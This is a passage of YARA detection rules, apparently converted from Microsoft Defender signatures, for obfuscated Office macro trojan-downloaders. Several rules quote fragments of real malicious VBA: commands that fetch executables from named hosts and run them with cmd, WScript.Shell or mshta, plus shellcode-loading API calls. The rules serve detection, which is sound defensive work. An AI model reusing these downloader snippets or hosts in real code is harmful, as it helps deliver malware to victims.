        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Chr(Asc(Mid(CuVauiHp8, IIf(J69pmuAv9 Mod Len(CuVauiHp8)" ascii //weight: 1
        $x_1_2 = "Debug.Print (VBA.Shell(c5YBWE6YP + rewDH1s8D + LRpBcKjpo + wJ9wo1Xlx))" ascii //weight: 1
        $x_1_3 = "Xor Asc(Mid(pWtKLVKu8, J69pmuAv9, 1)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_RVAO_2147805669_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RVAO!MTB"
        threat_id = "2147805669"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "aHR0cDovLzBrbncyMzAwLm15cHJlc3NvbmxpbmUuY29tL2QucGhw" ascii //weight: 1
        $x_1_2 = "Y2FsbCgia2VybmVsMzIiLCAiV2luRXhlYyIsICJKRkoiLCAid3NjcmlwdCAvL2U6dmJzY3JpcHQgLy9iICIi" ascii //weight: 1
        $x_1_3 = "wob = CreateObject(\"wscript.shell\")" ascii //weight: 1
        $x_1_4 = "& \"\\de\" & \"sk\" & \"to\" & \"p.ini\"" ascii //weight: 1
        $x_1_5 = "ini = Replace(ini, \"\\\", \"\\\\\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_RVAP_2147805773_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RVAP!MTB"
        threat_id = "2147805773"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "8"
        strings_accuracy = "High"
    strings:
        $x_5_1 = "xHttp.Open \"GET\", \"http://speedtest.tele2.net/10MB.zip\", False" ascii //weight: 5
        $x_5_2 = "xHttp.Open \"GET\", \"https://list24.online/msp.exe\", False" ascii //weight: 5
        $x_2_3 = ".savetofile \"10MB.zip\", 2" ascii //weight: 2
        $x_2_4 = ".savetofile \"C:\\Windows\\Temp\\msp.exe\", 2" ascii //weight: 2
        $x_1_5 = "xHttp: Set xHttp = CreateObject(\"Microsoft.XMLHTTP\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_5_*) and 1 of ($x_2_*) and 1 of ($x_1_*))) or
            ((1 of ($x_5_*) and 2 of ($x_2_*))) or
            ((2 of ($x_5_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Obfuse_PDA_2147808494_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PDA!MTB"
        threat_id = "2147808494"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "CreateThread" ascii //weight: 1
        $x_1_2 = "VirtualAlloc" ascii //weight: 1
        $x_1_3 = {26 20 43 68 72 24 28 56 61 6c 28 22 26 48 22 20 26 20 4d 69 64 24 28 [0-21] 2c 20 [0-21] 2c 20 32 29 29 29}  //weight: 1, accuracy: Low
        $x_1_4 = {3d 20 31 20 54 6f 20 4c 65 6e 28 [0-21] 29 20 53 74 65 70 20 32}  //weight: 1, accuracy: Low
        $x_1_5 = {28 30 2c 20 55 42 6f 75 6e 64 28 [0-21] 29 2c 20 26 48 31 30 30 30 2c 20 26 48 34 30 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PDM_2147808580_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PDM!MTB"
        threat_id = "2147808580"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "=chr(50)+chr(48)+chr(48)" ascii //weight: 1
        $x_1_2 = "specialpath=wshshell.specialfolders(\"recent\")" ascii //weight: 1
        $x_1_3 = "=specialpath+(\"\\zr.\").open\"get\",(\"h://djkmw.m.l.1dv.m/4mmz6hkzfht" ascii //weight: 1
        $x_1_4 = "=1range(\"j1\").value=\"eklibelgeyiama\"msgbox\"pleasewait....\"range(\"bc3\").value=" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PDB_2147808597_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PDB!MTB"
        threat_id = "2147808597"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 43 68 72 28 35 30 29 20 2b 20 43 68 72 28 34 38 29 20 2b 20 43 68 72 28 34 38 29 [0-16] 44 69 6d 20 57 73 68 53 68 65 6c 6c 20 41 73 20 4f 62 6a 65 63 74 [0-16] 44 69 6d 20 53 70 65 63 69 61 6c 50 61 74 68 20 41 73 20 53 74 72 69 6e 67}  //weight: 1, accuracy: Low
        $x_1_2 = "ActiveWorkbook.Password = \"pago2022\"" ascii //weight: 1
        $x_1_3 = "= Environ$(\"AppData\") & \"\\\" &" ascii //weight: 1
        $x_1_4 = "/hojmsvi.tk/xxx00" ascii //weight: 1
        $x_1_5 = {41 70 70 44 61 74 61 20 3d 20 41 70 70 44 61 74 61 20 26 20 43 68 72 28 41 73 63 28 [0-37] 29 20 2d 20 [0-3] 29 [0-16] 4e 65 78 74}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PDC_2147808913_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PDC!MTB"
        threat_id = "2147808913"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "=environ$(\"appdata\")&\"\\\"&" ascii //weight: 1
        $x_1_2 = "=chr(50)+chr(48)+chr(48)dimwshshellasobjectdimspecialpath" ascii //weight: 1
        $x_1_3 = "setobjwshshell=createobject(\"wscript.shell\")specialpath=objwshshell.specialfolders(\"templates\")" ascii //weight: 1
        $x_1_4 = "=createobject(\"shell.application\")=specialpath+(\"\\mjhm.\").open\"get\"" ascii //weight: 1
        $x_1_5 = "=strreverse(enc)" ascii //weight: 1
        $x_1_6 = "appdata=appdata&chr(asc" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PKC_2147808916_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PKC!MTB"
        threat_id = "2147808916"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Url = \"http://211.252.131.224/2021/image/4qmal.gif" ascii //weight: 1
        $x_1_2 = "Download_Go.SaveToFile \"C:\\Temp\\4qmal.gif\", 2" ascii //weight: 1
        $x_1_3 = "= VBA.CreateObject(\"WScript.Shell\")" ascii //weight: 1
        $x_1_4 = "= \"/c \" & \"rename \" & \"C:\\Temp\\4qmal.gif 4qmal.exe\"" ascii //weight: 1
        $x_1_5 = "wsh.Run \"C:\\Windows\\System32\\cmd.exe \" & cmdText," ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_SAAM_2147808962_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.SAAM!MTB"
        threat_id = "2147808962"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "NmBEcAvAjcpCLBfEaWzChWid.Run NSZIRbryXtSZhGDHwrGqqyc, gBbaiUwesq, True" ascii //weight: 1
        $x_1_2 = "KFuhRsRXUlAD = \"gqh2i|i$3g${lseqm" ascii //weight: 1
        $x_1_3 = "Set GTYSCQhRrFELrAEixN = CreateObject(ZtnLTlZXIdOspfOW(EDQsyyBoynznuqlst))" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_RVAQ_2147809300_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RVAQ!MTB"
        threat_id = "2147809300"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "CreateObject(zbziynkoqeyb(\"575363726970\") & zbziynkoqeyb(\"742e5368656c6c\")).Run" ascii //weight: 1
        $x_1_2 = "Chr$(Val(\"&H\" & Mid$(cmazxducfgnm, yjzbjvipifjl, 2)))" ascii //weight: 1
        $x_1_3 = ".Open ksooylmybogf(\"474554\"), naotktxlknpjx, False" ascii //weight: 1
        $x_1_4 = "Environ(\"TEMP\") & \"\\\" & dlakaokklnsrrus" ascii //weight: 1
        $x_1_5 = {41 75 74 6f 4f 70 65 6e 28 29 0d 0a 67 6d 65 61 7a 79 72 79 6b}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PKD_2147809532_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PKD!MTB"
        threat_id = "2147809532"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 57 73 63 72 69 70 74 2e 53 68 65 6c 6c 22 29 2e 45 58 45 43 20 [0-5] 20 2b}  //weight: 1, accuracy: Low
        $x_1_2 = {3d 20 56 42 41 2e 52 65 70 6c 61 63 65 28 22 6d 73 68 [0-5] 22 2c 20 22 [0-5] 22 2c 20 22 74 61 22 29}  //weight: 1, accuracy: Low
        $x_1_3 = "= \" http://j.mp/\"" ascii //weight: 1
        $x_1_4 = "Debug.Print MsgBox(\"Re-Install Office\", vbOKCancel); returns; 1" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PDD_2147809625_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PDD!MTB"
        threat_id = "2147809625"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "=chr(50)+chr(48)+chr(48)setwshshell=" ascii //weight: 1
        $x_1_2 = "=specialpath+(\"\\mhk.\").open" ascii //weight: 1
        $x_1_3 = "=wshshell.specialfolders(\"recefvdzb\")" ascii //weight: 1
        $x_1_4 = "=getdesktop+huguhhjghjgtroin(jhbhefverfd.oin)moijhiuf.open\"iiuky\"" ascii //weight: 1
        $x_1_5 = ".value=\"<<ok......ok>>\"msgbox\"<<ok......ok>>" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PDH_2147810336_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PDH!MTB"
        threat_id = "2147810336"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "=chr(50)+chr(48)+chr(48)fnnk" ascii //weight: 1
        $x_1_2 = "specialpath=wshshell.specialfolders(\"recent\")" ascii //weight: 1
        $x_1_3 = "=specialpath+omjihjnbhghghgvjv(\"i^_oxduxv[;nn\")cstesu.open\"get\",omjihjnbhghghgvjv" ascii //weight: 1
        $x_1_4 = ".writetfdveghoimjin.savetofilexyuhvla,vtfqcyw+vtfqcyw+fdsnkjnsd+ojhihbhjbboimjin." ascii //weight: 1
        $x_1_5 = ".open(xyuhvla)endsubfunction" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PKF_2147810923_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PKF!MTB"
        threat_id = "2147810923"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "alami3 = \"t\" + \"a ht\"" ascii //weight: 1
        $x_1_2 = "ubun3.Tag" ascii //weight: 1
        $x_1_3 = {70 6f 77 65 72 31 20 3d 20 22 [0-48] 22 02 00 6a 61 6e 77 61 72 20 3d 20 61 6c 61 6d 69 30 20 2b 20 61 6c 61 6d 69 31 20 2b 20 61 6c 61 6d 69 32 20 2b 20 61 6c 61 6d 69 33 20 2b 20 61 6c 61 6d 69 34 20 2b 20 6a 61 6e 77 61 72 33 20 2b 20 6a 61 6e 77 61 72 34 20 2b 20 70 6f 77 65 72 31 02 00 45 6e 64 20 46 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: Low
        $x_1_4 = {53 75 62 20 5f 02 00 41 55 74 6f 5f 43 6c 4f 73 65 28 29}  //weight: 1, accuracy: Low
        $x_1_5 = "gando.uganda" ascii //weight: 1
        $x_1_6 = "Shell janwar" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PDK_2147811279_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PDK!MTB"
        threat_id = "2147811279"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "=chr(50)+chr(48)+chr(48)setwshshell=createobject" ascii //weight: 1
        $x_1_2 = "specialpath=wshshell.specialfolders(\"recent\")" ascii //weight: 1
        $x_1_3 = "=specialpath+(\"\\vtgr.\").open\"get\",(\"h://www.w.m/dgdzvdvgdzvkbvhdzgg/bkjbgkgkjhjdhjdjgjhkgkjhjdhjdjgjbkjbg." ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PDL_2147811280_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PDL!MTB"
        threat_id = "2147811280"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "=chr(50)+chr(48)+chr(48)" ascii //weight: 1
        $x_1_2 = "specialpath=wshshell.specialfolders(\"recent\")" ascii //weight: 1
        $x_1_3 = "=specialpath+(\"\\gx.\").open\"get\",(\"h://www.-k.g/w/kljkjghkjwwhgkkhjbwbbgj/bzbbgd." ascii //weight: 1
        $x_1_4 = "=specialpath+(\"\\wmfftx.\").open\"get\",(\"h://jvmkg.m/hkbv/jbhbmgjbvwvgqg." ascii //weight: 1
        $x_1_5 = {3d 73 70 65 63 69 61 6c 70 61 74 68 2b 28 22 5c [0-3] 2e 22 29 2e 6f 70 65 6e 22 67 65 74 22 2c 28 22 68 3a 2f 2f 77 77 77 2e 64 2e 6d 2f 6b 6a 62 76 64 6a 62 68 62 62 76 68 6b 7a 62 64 6b 7a 6c 62 6b 67 2f 6b 6b 6a 62 6b 6a 62 76 68 2e}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PKS_2147812486_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PKS!MTB"
        threat_id = "2147812486"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= \"://www.bitly.com/\"" ascii //weight: 1
        $x_1_2 = ".copyfile \"C:\\Windows\\System32\\mshta.exe\", Environ(\"PUBLIC\") & \"\\peee.com\", True" ascii //weight: 1
        $x_1_3 = "\"ERROR !!!\": Call VBA.Shell _" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_KAF_2147812854_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.KAF!MTB"
        threat_id = "2147812854"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "kaosk.copyfile Int2Str(\"067058092087105110100111119115092083121115116101109051050092109115104116097046101120101\"), Environ$(Int2Str(\"080085066076073067\")) & Int2Str(\"092112101101101046099111109\"), True" ascii //weight: 1
        $x_1_2 = "kokokasd = Environ$(Int2Str(\"112085066076073067\")) & Int2Str(\"09206807606508306807610810610009711710011911110711510610009711710011911110711510610009711710011911110711504810811110803210411611611211505811" ascii //weight: 1
        $x_1_3 = "adjaiwdjiaskd = Int2Str(\"048049110050103050116107111107111107097115100058\")" ascii //weight: 1
        $x_1_4 = "aksdokasodkoaksd = Int2Str(\"097107115100111107097115111100107111097107115100053110111111111095080114111099101054054\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PDN_2147812871_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PDN!MTB"
        threat_id = "2147812871"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "=chr(50)+chr(48)+chr(48)" ascii //weight: 1
        $x_1_2 = "specialpath=wshshell.specialfolders(\"recent\")" ascii //weight: 1
        $x_1_3 = "specialpath=wshshell.specialfolders(\"appdata\")" ascii //weight: 1
        $x_1_4 = {3d 73 70 65 63 69 61 6c 70 61 74 68 2b 28 22 5c [0-10] 2e 22 29 2e 6f 70 65 6e 22 67 65 74 22 2c 28 22 68 3a 2f 2f 77 77 77 2e 64 2e 6d 2f 71 6d 7a 6c 62 6b 67 2f 6b 68 62 76 68 2e}  //weight: 1, accuracy: Low
        $x_1_5 = {3d 73 70 65 63 69 61 6c 70 61 74 68 2b 28 22 5c [0-10] 2e 22 29 2e 6f 70 65 6e 22 67 65 74 22 2c 28 22 68 3a 2f 2f 77 77 77 2e 64 2e 6d 2f 67 6a 6b 6b 68 68 68 67 2f 6b 6a 64 68 2e}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PKV_2147812969_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PKV!MTB"
        threat_id = "2147812969"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = ".adnoc-distributions.com/projects/enquiry.zip" ascii //weight: 1
        $x_1_2 = "C:\\Users\\\" & Environ(\"UserName\") & \"\\Documents" ascii //weight: 1
        $x_1_3 = "= CreateObject(\"WScript.Shell\").SpecialFolders(\"MyDocuments\")" ascii //weight: 1
        $x_1_4 = "= URLDownloadToFile(0, strURL, strPath, 0, 0)" ascii //weight: 1
        $x_1_5 = "ShellApp.Namespace(unzipToPath).CopyHere ShellApp.Namespace(zippedFileFullName).Items" ascii //weight: 1
        $x_1_6 = "Then MsgBox \"Something went wrong!" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_KAG_2147813012_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.KAG!MTB"
        threat_id = "2147813012"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "kaosk = GetObject(" ascii //weight: 1
        $x_1_2 = "kaosk.copyfile" ascii //weight: 1
        $x_1_3 = "kokokasd = Replace(" ascii //weight: 1
        $x_1_4 = "adjaiwdjiaskd = Replace(" ascii //weight: 1
        $x_1_5 = "GetObject(adjaiwdjiaskd). _" ascii //weight: 1
        $x_1_6 = "Get(aksdokasodkoaksd). _" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PDO_2147813757_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PDO!MTB"
        threat_id = "2147813757"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "=chr(50)+chr(48)+chr(48)" ascii //weight: 1
        $x_1_2 = "specialpath=wshshell.specialfolders(\"recent\")" ascii //weight: 1
        $x_1_3 = "specialpath=wshshell.specialfolders(\"appdata\")" ascii //weight: 1
        $x_1_4 = {3d 73 70 65 63 69 61 6c 70 61 74 68 2b 28 22 5c [0-10] 2e 22 29 2e 6f 70 65 6e 22 67 65 74 22 2c 28 22 68 3a 2f 2f 77 77 77 2e 64 2e 6d 2f 6a 68 68 68 64 68 67 68 2f 6b 6b 6a 62 6b 6a 62 76 68 2e}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PDE_2147813777_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PDE!MTB"
        threat_id = "2147813777"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "=environ$(\"userprofile\")&\"\\\"&" ascii //weight: 1
        $x_1_2 = "=chr(50)+chr(48)+chr(48)" ascii //weight: 1
        $x_1_3 = {73 70 65 63 69 61 6c 70 61 74 68 3d 77 73 68 73 68 65 6c 6c 2e 73 70 65 63 69 61 6c 66 6f 6c 64 65 72 73 28 22 [0-10] 22 29}  //weight: 1, accuracy: Low
        $x_1_4 = {3d 73 70 65 63 69 61 6c 70 61 74 68 2b 28 22 [0-10] 2e 22 29 2e 6f 70 65 6e 22 67 65 74 22 2c}  //weight: 1, accuracy: Low
        $x_1_5 = "(\"fyf/ddnn\")" ascii //weight: 1
        $x_1_6 = "fyf/nppghynkcodnkgeihgetigjpusqd0og5oskhks1111nuqpujuvusgehethg0npd/tbojeobspudbsu00;tquui" ascii //weight: 1
        $x_1_7 = "range(\"a1\").value=\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_RVAR_2147813821_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.RVAR!MTB"
        threat_id = "2147813821"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= GetObject(\"\" + \"n\" + \"e\" + \"w\" + \":\" + \"F93\" + \"5\" + \"D\" + \"C\" + \"2\" + \"2\" + \"-\" + \"1\" + \"C\" + \"F\" + \"0-1\" + \"1D0-ADB9-\" + \"00C04\" + \"FD\" + \"5\" + \"8\" + \"A\" + \"0\" + \"B\")" ascii //weight: 1
        $x_1_2 = "meinkonhun1.EXEC listen1 + madar2 + janu3 + janu4 + fakir4" ascii //weight: 1
        $x_1_3 = "\"m\" + \"s\" + \"h\" + \"t\" + \"a h\" + \"t\" + \"t\" + \"p\" + \"s\" + \"://" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Obfuse_PKX_2147814152_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Obfuse.PKX!MTB"
        threat_id = "2147814152"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Obfuse"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {70 61 72 61 6c 61 67 6c 6f 69 72 65 2e 63 6f 6d 2f [0-32] 2f 31 31 2e 70 [0-5] 6e 67 22 2c 22}  //weight: 1, accuracy: Low
        $x_1_2 = {61 62 6e 65 77 73 6c 69 76 65 2e 69 6e 2f [0-32] 2f 31 31 2e 70 6e [0-5] 67 22 2c 22}  //weight: 1, accuracy: Low
